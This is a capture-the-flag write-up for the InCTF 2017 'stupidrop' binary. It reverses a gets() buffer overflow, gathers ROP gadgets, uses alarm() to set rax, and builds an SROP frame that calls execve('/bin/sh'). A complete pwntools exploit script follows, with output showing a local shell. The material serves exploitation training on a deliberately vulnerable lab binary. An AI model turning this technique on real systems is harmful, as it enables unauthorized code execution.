# Inctf 2017 stupidrop

Let's take a look at the binary:

```
$    file stupidrop
stupidrop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f0ff8340bc3eead42d0f7b14535ee7c74a6ca7d, not stripped
$    pwn checksec stupidrop
[*] '/Hackery/pod/modules/srop/inctf17_stupidrop/stupidrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./stupidrop
15935728
```

So we can see that we are dealing with a `64` bit dynamically linked binary, with an NX stack. When we run it, it prompts us for input:

## Reversing

Looking at the main function, we can see an obvious bug:

```
undefined8 main(void)

{
  char input [48];
 
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x20);
  gets(input);
  return 0;
}
```

So it uses `gets`, which gives us a buffer overflow (when we check the offset, we see it is `0x38`) that we can hit the saved return address with. Since there is no Stack Canary, we will be able to get code execution without a leak.

#### Writing /bin/sh

So for our exploit, we will be using an SROP attack to jump to a syscall, and make an `execve("/bin/sh", NULL, NULL)` call. To do that, we will need to write `/bin/sh\x00` somewhere to memory, at an address we know. Looking at the bss in Ghidra, we see that `0x601050` would probably be a good candidate. This is because it doesn't look like anything is stored there that would mess with what we are doing, we know it's address (thanks to no PIE), and that it is in a memory region that we can read and write to:

```
        00601050 00              undefined1 00h
        00601051 00              ??         00h
        00601052 00              ??         00h
        00601053 00              ??         00h
        00601054 00              ??         00h
        00601055 00              ??         00h
        00601056 00              ??         00h
        00601057 00              ??         00h
```

Now for how to write `/bin/sh\x00` to `0x601050`, we will call `gets`. The function `gets` is imported (we can see it under the list of imports in Ghidra), and since PIE isn't enabled we know it's address. So we will just call `gets` with `0x601050` as an argument (which we have the rop gadgets for), and write `/bin/sh\x00` to `0x601050`.

Getting the rop gadget:
```
$ python ROPgadget.py --binary stupidrop | grep "pop rdi"
0x00000000004006a3 : pop rdi ; ret
```

#### Writing Rax Value

So for the SROP syscall, we will need to set `rax` equal to `0xf` (since `rax` specifies what syscall will be made). However we don't really have any rop gadgets that we can use, which will set it. So we will be setting it by calling the `alarm` function, since return values are stored in the `rax` register.

The `alarm` function is used to specify how many seconds to wait before generating a `SIGALRM`. It takes a single argument, an unsigned int specifying the amount of seconds. If we call `alarm` once, it will set the number of seconds (which the return value will be `0`). If we call it a second time with an argument of `0`, it will cancel the pending alarm and return the number of seconds remaining. With this, we can call `alarm` once with an argument (stored) in the `rdi` register equal to `0xf`. Then proceeding that we can just call `alarm` again with the `rdi` register being equal to `0x0` and it will set `rax` to `0xf` as the return value.

#### SROP attack

Now that we have `rax` set to `0xf`, space on the stack to store our sigreturn frame, and we have a syscall rop gadget:

```
$ python ROPgadget.py --binary stupidrop | grep syscall
0x000000000040063e : syscall
```

So we have everything we need to make the sigreturn. So we have control over all of the registers. Since we have the syscall rop gadget and a pointer to `/bin/sh`, we can make the `execve("/bin/sh", NULL, NULL)` call. In order to get that, we will have the following registers set accordingly:

```
rip:  0x40063e (address of syscall rop gadget)
rax:  0x3b (specify execve syscall)
rdi:  0x601050 (pointer to "/bin/sh")
rsi:  0x0 (specify no arguments)
rdx:  0x0 (specify no enviornment variables)
```

That syscall will pop a shell for us. We will just store the frame right after the srop syscall, since that will put it at the top of the stack for the sigreturn (which is where it expects it).

## Exploit

Putting it all together, we get the following exploit:

```
from pwn import *

# Establish the target
target = process('./stupidrop')
gdb.attach(target, gdbscript='b *0x400289')

elf = ELF('stupidrop')

context.arch = "amd64"

# Establish needed gadgets
syscall = p64(0x40063e)
popRdi = p64(0x4006a3)

# Establish needed functions
gets = p64(elf.symbols['gets'])
alarm = p64(elf.symbols['alarm'])

# Establish address where we will write "/bin/sh"
binshAdr = p64(0x601050)

# Filler to return address
payload = ""
payload += "0"*0x38

# Use gets to write "/bin/sh" to 0x601050
payload += popRdi
payload += binshAdr
payload += gets


# Use alarm to set the rax register to 0xf
payload += popRdi
payload += p64(0xf)
payload += alarm
payload += popRdi
payload += p64(0x0)
payload += alarm

# Execute the SROP to make the execve call
frame = SigreturnFrame()

# Specify rip to point to the syscall instruction
frame.rip = 0x40063e

# Prep the registers for the execve syscall
frame.rax = 0x3b
frame.rdi = 0x601050
frame.rsi = 0x0
frame.rdx = 0x0

# Add the sigreturn frame to the payload, and make the syscall
payload += syscall
payload += str(frame)


# Send the payload
target.sendline(payload)

# Send "/bin/sh" to the gets call
raw_input()
target.sendline("/bin/sh\x00")


target.interactive()
```

When we run it:

```
$ python exploit.py
[+] Starting local process './stupidrop': pid 10520
[*] running in new terminal: /usr/bin/gdb -q  "./stupidrop" 10520 -x "/tmp/pwnyQjXEX.gdb"
[+] Waiting for debugger: Done
[*] '/Hackery/pod/modules/srop/inctf17_stupidrop/stupidrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

[*] Switching to interactive mode
$ w
 22:09:26 up  3:22,  1 user,  load average: 1.56, 1.80, 1.86
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               18:47   ?xdm?  15:46   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
$ ls
ROPgadget.py  core  exploit.py    readme.md  stupidrop
```

Just like that, we popped a shell!